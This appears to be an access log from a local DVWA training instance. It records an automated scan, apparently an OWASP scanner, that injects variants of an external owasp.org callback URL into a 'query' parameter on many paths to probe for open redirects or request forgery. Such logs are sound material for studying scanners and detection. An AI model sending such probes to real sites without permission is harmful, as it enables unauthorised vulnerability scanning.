172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 618 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 618 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 618 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /docs/DVWA_v1.3.pdf?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css?query=393116451647016622.owasp.org HTTP/1.1" 301 598 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 624 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 626 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 624 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 626 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 610 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 610 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 624 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 626 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /docs/DVWA_v1.3.pdf?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /docs/DVWA_v1.3.pdf?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/login.css?query=393116451647016622.owasp.org HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /docs/DVWA_v1.3.pdf?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/login.css?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/login.css?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/login.css?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/login.css?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/login.css?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/login.css?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/login.css?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/login.css?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /docs/DVWA_v1.3.pdf?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /docs/DVWA_v1.3.pdf?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /docs/DVWA_v1.3.pdf?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/main.css?query=393116451647016622.owasp.org HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/main.css?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/main.css?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/main.css?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/main.css?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/main.css?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/main.css?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/main.css?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css/main.css?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images?query=393116451647016622.owasp.org HTTP/1.1" 301 604 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 630 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 632 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 630 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 632 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images/login_logo.png?query=393116451647016622.owasp.org HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images/login_logo.png?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images/login_logo.png?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 630 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images/login_logo.png?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 632 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images/login_logo.png?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images/login_logo.png?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/images/login_logo.png?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/login_logo.png?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/login_logo.png?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/logo.png?query=393116451647016622.owasp.org HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/RandomStorm.png?query=393116451647016622.owasp.org HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/logo.png?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/RandomStorm.png?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/logo.png?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/RandomStorm.png?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/logo.png?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/logo.png?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/RandomStorm.png?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/logo.png?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/RandomStorm.png?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/logo.png?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/RandomStorm.png?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/logo.png?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/RandomStorm.png?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/logo.png?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/RandomStorm.png?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/RandomStorm.png?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js?query=393116451647016622.owasp.org HTTP/1.1" 301 596 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/spanner.png?query=393116451647016622.owasp.org HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/spanner.png?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 622 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/spanner.png?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/spanner.png?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 624 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/spanner.png?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 622 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/spanner.png?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 624 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/spanner.png?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 608 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/spanner.png?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/images/spanner.png?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 608 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:44 +0000] "GET /dvwa/js?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 622 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
